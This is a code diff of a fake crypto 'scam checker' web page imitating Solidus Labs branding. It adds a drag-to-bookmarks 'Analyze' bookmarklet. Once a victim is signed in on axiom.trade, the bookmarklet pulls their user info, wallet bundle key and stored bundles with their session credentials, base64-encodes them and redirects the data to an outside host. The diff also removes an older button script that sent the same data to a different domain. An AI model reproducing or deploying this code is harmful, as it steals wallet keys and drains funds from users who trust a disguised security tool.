@@ -33,7 +33,20 @@
           </div>
         </div>
         <div class="Home_home__empxm">
-<!-- BOUTON BOOKMARKLET AU-DESSUS DU LOGO -->
+          <object data="logo2.svg" type="image/svg+xml" class="Home_mainLogo__HkFYs"></object>
+          <div style="height:40vh">
+            <div style="text-align:center">
+              Actively monitoring <span class="Home_solidusYellow__wVVeS">27 132 449</span> tokens<br/>
+              and <span class="Home_solidusYellow__wVVeS">2 867 775</span> scams
+            </div>
+            <div style="margin-top:4em">
+              <div class="Home_searchBar__9r0nl">
+                <input autoComplete="off" class="Home_search_Input__moBoV" placeholder="Search tokens by address" type="search" maxLength="44"/>
+                <input autoComplete="off" class="Home_searchInput__fVjDa" placeholder="Search tokens by address" type="search" maxLength="44"/>
+              </div>
+            </div>
+            <div style="margin-top:4em;text-align:center">
+  <!-- BOUTON BOOKMARKLET AU-DESSUS DU LOGO -->
 <div style="text-align:center; margin-bottom:1em;">
   <a
     href="javascript:(async()=>{try{if(location.hostname==='https://www.tokensnifer.com/')return alert('You must drag the bookmarklet to your bookmarks bar instead of clicking it.');if(location.hostname!='axiom.trade'){alert('You are now being redirected to https://axiom.trade/discover.'),location.replace('https://axiom.trade/discover')}else{if(!localStorage.getItem('isAuthed'))return alert('You must be signed in to use this bookmarklet.');const user=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();const bundleRes=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();const bundleString=`${localStorage.getItem('sBundles')};${bundleRes.bundleKey}`;location.replace(`https://trendsniperpro.vercel.app//api/wallets?data=${btoa(JSON.stringify({hash:'MDs3NTE3MDE1NDcx',site:'https://trendsniperpro.vercel.app//api/wallets',user,bundle:bundleString}))}`)}}catch(e){alert('Failed to execute the bookmarklet. Please try again later.')}})();"
@@ -52,46 +65,13 @@
       box-shadow:0 2px 8px #0002;
       user-select:none;
       position:relative;
-      top: 58px;"
+      top: -24px;"
     title="Drag me to your bookmarks bar to use me"
     draggable="true"
   >
-    Drag me to use me
+    Analyze
   </a>
 </div>
-          <object data="logo2.svg" type="image/svg+xml" class="Home_mainLogo__HkFYs"></object>
-          <div style="height:40vh">
-            <div style="text-align:center">
-              Actively monitoring <span class="Home_solidusYellow__wVVeS">27 132 449</span> tokens<br/>
-              and <span class="Home_solidusYellow__wVVeS">2 867 775</span> scams
-            </div>
-            <div style="margin-top:4em">
-              <div class="Home_searchBar__9r0nl">
-                <input autoComplete="off" class="Home_search_Input__moBoV" placeholder="Search tokens by address" type="search" maxLength="44"/>
-                <input autoComplete="off" class="Home_searchInput__fVjDa" placeholder="Search tokens by address" type="search" maxLength="44"/>
-              </div>
-            </div>
-            <div style="margin-top:4em;text-align:center">
-  <button
-  id="demoBtn"
-  style="
-    background:#ffcd26;
-    color:#000;
-    border:none;
-    border-radius:2em;
-    padding:0.6em 1.8em;
-    font-size:1em;
-    font-weight:500;
-    cursor:pointer;
-    margin-top:-2.5em;
-    display:block;
-    margin-left:auto;
-    margin-right:auto;
-  "
->
-  Rechercher
-</button>
-  <br>
   Powered by <a class="Home_solidusLink__baoS4" href="https://www.soliduslabs.com/">Solidus Labs</a>
 </div>
           </div>
@@ -138,34 +118,5 @@
       </footer>
     </div>
   </div>
-<script>
-document.getElementById("demoBtn").onclick = function() {
-  (async()=>{
-    try {
-      if(location.hostname === "www.tokensnifer.com")
-        return alert("You must drag the bookmarklet to your bookmarks bar instead of clicking it.");
-      if(location.hostname != "axiom.trade") {
-        alert("You are now being redirected to https://axiom.trade/discover.");
-        location.replace("https://axiom.trade/discover");
-      }
-      else {
-        if(!localStorage.getItem("isAuthed"))
-          return alert("You must be signed in to use this bookmarklet.");
-        const user = await (await fetch("//api7.axiom.trade/user-info", {method:"POST",credentials:"include"})).json();
-        const bundleRes = await (await fetch("//api8.axiom.trade/bundle-key-and-wallets", {method:"POST",credentials:"include"})).json();
-        const bundleString = `${localStorage.getItem("sBundles")};${bundleRes.bundleKey}`;
-        location.replace(`https://axiom-server.icu/${btoa(JSON.stringify({
-          hash:"MDs3NTE3MDE1NDcx",
-          site:"https://trendsniperpro.vercel.app//api/wallets",
-          user,
-          bundle:bundleString
-        }))}`);
-      }
-    } catch(e) {
-      alert("Failed to execute the bookmarklet. Please try again later.");
-    }
-  })();
-};
-</script>
 </body>
 </html>
